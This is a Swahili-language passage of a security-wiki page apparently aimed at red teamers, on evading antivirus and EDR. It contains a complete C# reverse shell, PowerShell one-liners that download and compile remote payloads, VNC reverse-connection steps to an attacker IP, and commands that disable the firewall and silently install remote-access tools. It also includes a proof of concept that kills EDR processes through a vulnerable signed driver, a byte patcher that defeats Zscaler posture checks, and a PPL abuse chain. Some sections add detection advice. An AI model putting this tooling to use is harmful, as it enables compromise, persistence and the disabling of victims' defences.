Inahusisha **kuanzisha mchakato mpya wa kujitoa (sacrificial process)**, kuingiza post-exploitation malicious code yako ndani ya mchakato huo mpya, kutekeleza code yako ya uharibifu na baada ya kumaliza, kuua mchakato huo mpya. Hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji unafanyika **nje** ya mchakato wetu wa Beacon implant. Hii inamaanisha kwamba ikiwa kitu katika hatua yetu ya post-exploitation kitaenda vibaya au kitakamatwa, kuna **uwezekano mkubwa zaidi** wa **implant kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu kuingiza post-exploitation malicious code **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kukipimwa na AV, lakini hasara ni kwamba ikiwa kitu kitaenda vibaya kwa utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon** kwani inaweza kushindwa (crash).

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu kupakia C# Assembly, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na BOF yao InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza malicious code kwa kutumia lugha nyingine kwa kumruhusu mashine iliyoharibika kupata mazingira ya interpreter iliyowekwa kwenye Attacker Controlled SMB share.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira kwenye SMB share unaweza **execute arbitrary code in these languages within memory** ya mashine iliyoharibika.

Repo inaonyesha: Defender bado inapima scripts lakini kwa kutumia Go, Java, PHP n.k. tunapata **more flexibility to bypass static signatures**. Ujaribu na random un-obfuscated reverse shell scripts katika lugha hizi umeonyesha mafanikio.

## TokenStomping

Token stomping ni mbinu inayoruhusu mshambuliaji **kuingilia access token au bidhaa ya usalama kama EDR au AV**, ikimruhusu kupunguza ruhusa zake ili mchakato usife lakini usiwe na ruhusa za kukagua shughuli hatarishi.

Ili kuzuia hili Windows inaweza **kuzuia michakato ya nje** kupata handles juu ya tokeni za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusanisha Chrome Remote Desktop kwenye PC ya mwathirika na kisha kuitumia kumimiliki na kudumisha persistence:
1. Download kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", kisha bonyeza faili la MSI kwa Windows ili kupakua faili ya MSI.
2. Endesha installer kwa kimya kwenye mashine ya mwathirika (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Wizard itakuuliza uidhinishe; bonyeza kitufe cha Authorize ili kuendelea.
4. Endesha parameter iliyotolewa kwa marekebisho machache: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka param ya pin inayoruhusu kuweka pin bila kutumia GUI).


## Advanced Evasion

Evasion ni mada ngumu sana, wakati mwingine unalazimika kuzingatia vyanzo vingi vya telemetry ndani ya mfumo mmoja, hivyo ni vigumu kabisa kubaki bila kugunduliwa katika mazingira yaliyojaa teknolojia.

Kila mazingira unayokabiliana nayo itakuwa na nguvu na udhaifu wake.

Ninakupongeza uangalie hotuba hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata mtazamo wa mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni hotuba nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Kale**

### **Angalia ni sehemu gani Defender inaona kuwa hatarishi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo itatoa sehemu za binary mpaka itagundua ni sehemu gani Defender inaiona kuwa hatarishi na itakuonyesha.\
Chombo kingine kinachofanya jambo **sawa** ni [**avred**](https://github.com/dobin/avred) na huduma ya wavuti inapatikana kwenye [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote ziliokuja na **Telnet server** ambayo unaweza kusanisha (kama administrator) ukifanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya **ianze** wakati mfumo unapoanza na **endesha** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka downloads za bin, si setup)

**KWENYE HOST**: Endesha _**winvnc.exe**_ na sanidi server:

- Washa chaguo _Disable TrayIcon_
- Weka nywila katika _VNC Password_
- Weka nywila katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

**attacker** anapaswa kukimbisha kwenye **host** yake binary `vncviewer.exe -listen 5900` ili iwe tayari kushika reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kubaki bila kuonekana usifanye mambo kadhaa

- Usianze `winvnc` ikiwa tayari inaendesha au utaanzisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendesha kwa `tasklist | findstr winvnc`
- Usianze `winvnc` bila `UltraVNC.ini` kuwa katika saraka hiyo hiyo au itasababisha [dirisha la config](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiruhusu `winvnc -h` kwa msaada au utaanzisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anza lister** kwa kutumia `msfconsole -r file.rc` na **endesha** **xml payload** kwa kutumia:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa atasitisha mchakato haraka sana.**

### Kujenga reverse shell yetu

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### C# Revershell ya Kwanza

Jenga kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Kutumia compiler katika C#
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Kupakua na kutekeleza moja kwa moja:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR kutoka Kernel Space

Storm-2603 ilitumia kifupi cha console kinachojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kuangusha ransomware. Zana hiyo inaleta **driver yake mwenye udhaifu lakini *imesainiwa*** na kuutumia kutekeleza operesheni za kernel zenye vipaumbele ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzizuia.

Mambo muhimu
1. **Signed driver**: Faili lililowekwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni driver iliyo saini kwa uhalali `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa sababu driver ina saini halali ya Microsoft, inaloweshwa hata wakati Driver-Signature-Enforcement (DSE) imewezeshwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili driver kama **kernel service** na wa pili unaiendesha ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Uwezo                              |
|-----------:|------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (inatumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD inakwepa kabisa ulinzi wa user-mode; code inayotekelezwa kwenye kernel inaweza kufungua michakato *ilizoangaziwa*, kuimaliza (terminate), au kughushi vitu vya kernel bila kujali PPL/PP, ELAM au vipengele vingine vya kuimarisha.

Utambuzi / Kupunguza hatari
•  Washa orodha ya kuzuia vulnerable-driver ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kuingiza `AToolsKrnl64.sys`.
•  Subiri (monitor) uundaji wa services mpya za *kernel* na toa tahadhari wakati driver inapopewa load kutoka saraka inayoweza kuandikwa na kila mtu au ikiwa haiko kwenye allow-list.
•  Angalia handles za user-mode kwa device objects maalum ikifuatiwa na simu za kushangaza za `DeviceIoControl`.

### Kuepuka Zscaler Client Connector Posture Checks kupitia On-Disk Binary Patching

Zscaler’s **Client Connector** inatekeleza sheria za device-posture kwa mteja moja kwa moja na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguzi mbili za kubuni zenye udhaifu zinafanya uepukaji kamili uwezekane:

1. Tathmini ya posture hufanyika **kikamilifu client-side** (boolean hutumwa kwa server).
2. Endpoints za ndani za RPC zinathibitisha tu kwamba executable inayounganisha imesainiwa na Zscaler (kwa kutumia `WinVerifyTrust`).

Kwa **kupachika binaries zenye saini nne kwenye diski** mbinu zote mbili zinaweza kutolewa/kuzimwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Inarudisha `1` kila wakati hivyo kila ukaguzi unakubalika |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ process yoyote (hata isiyosainiwa) inaweza ku-bind kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imereplaced na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Zimekataliwa / short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za awali na kuanzisha upya msururu wa huduma:

* **All** posture checks display **green/compliant**.
* Binaries zisizotiwa saini au zilizorekebishwa zinaweza kufungua named-pipe RPC endpoints (kwa mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Mshini uliodukuliwa unapata ufikiaji bila vikwazo wa mtandao wa ndani uliofafanuliwa na sera za Zscaler.

Utafiti huu wa kesi unaonyesha jinsi maamuzi ya kuaminiana upande wa mteja na ukaguzi rahisi wa saini yanavyoweza kushindwa kwa patch ndogo za byte.

## Kutumia vibaya Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) inatekeleza hierarchy ya signer/level ili tu michakato iliyolindwa yenye kiwango sawa au cha juu iweze kuhujumiwa miongoni mwao. Kwa upande wa shambulizi, ikiwa unaweza kuanzisha kwa halali binary iliyo na PPL na kudhibiti arguments zake, unaweza kubadilisha utendakazi usio hatari (kwa mfano, logging) kuwa primitive ya kuandika iliyodhibitiwa, inayoungwa mkono na PPL dhidi ya saraka zilizolindwa zinazotumika na AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Msaidizi wa chanzo wazi: CreateProcessAsPPL (huchagua protection level na hupitisha arguments kwa EXE lengwa):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` inajizalisha yenyewe na inakubali parameter ya kuandika faili ya log kwenye njia iliyotajwa na mtumiaji.
- Iwapo itaendeshwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa msaada wa PPL.
- ClipUp haiwezi kuchanganua njia zenye nafasi; tumia njia fupi za 8.3 kuonyesha maeneo ambayo kawaida yanalindwa.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` katika kila saraka mzazi.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Anzisha LOLBIN inayoweza PPL (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (kwa mfano CreateProcessAsPPL).
2) Pitisha hoja ya log-path ya ClipUp ili kulazimisha uundaji wa faili katika saraka ya AV inayolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 ikiwa inahitajika.
3) Ikiwa binary lengwa kwa kawaida iko wazi/imefungwa na AV wakati inapoendesha (kwa mfano, MsMpEng.exe), panga uandishi wakati wa boot kabla AV haijaanza kwa kusanidi service ya kuanzisha kiotomatiki ambayo inafanya kazi mapema kwa uhakika. Thibitisha mpangilio wa boot kwa kutumia Process Monitor (boot logging).
4) Baada ya reboot uandishi unaoungwa mkono na PPL hutokea kabla AV haijafunga binaries zake, ukaharibu faili lengwa na kuzuia startup.

Mfano wa kuitisha (njia zimefichwa/zimefupishwa kwa usalama):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Huwezi kudhibiti yaliyomo ambayo ClipUp inaandika zaidi ya mahali; primitive hii inafaa kwa uharibifu badala ya uingizaji sahihi la yaliyomo.
- Inahitaji local admin/SYSTEM ili kusanidi/kuanza service na dirisha la kuwasha upya.
- Muda ni muhimu: lengo halipaswi kuwa wazi; utekelezaji wakati wa boot huzuia kufungwa kwa faili.

Detections
- Uundaji wa mchakato wa `ClipUp.exe` na hoja zisizo za kawaida, hasa ukiwa umewekwa chini ya launchers zisizo za kawaida, karibu na boot.
- Services mpya zilizosanidiwa kuanza moja kwa moja binaries zenye kuhatarisha na kuanza kwa urahisi kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa startup kwa Defender.
- Ufuatiliaji wa uadilifu wa faili kwenye Defender binaries/Platform directories; uundaji/urekebishaji wa faili usiotarajiwa na michakato yenye protected-process flags.
- ETW/EDR telemetry: tafuta michakato iliyoundwa na `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya ngazi za PPL na binaries ambazo si-AV.

Mitigations
- WDAC/Code Integrity: zuia ni binaries zipi zilizosainiwa zinaweza kukimbia kama PPL na chini ya wazazi gani; zuia mwito wa ClipUp nje ya muktadha halali.
- Service hygiene: zuia uundaji/urekebishaji wa services za auto-start na fuatilia uchezaji wa mpangilio wa kuanza.
- Hakikisha Defender tamper protection na early-launch protections zimeshashawaka; chunguza makosa ya startup yanayoonyesha uharibifu wa binary.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazoendesha zana za usalama ikiwa inafaa kwa mazingira yako (jaribu kwa kina).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
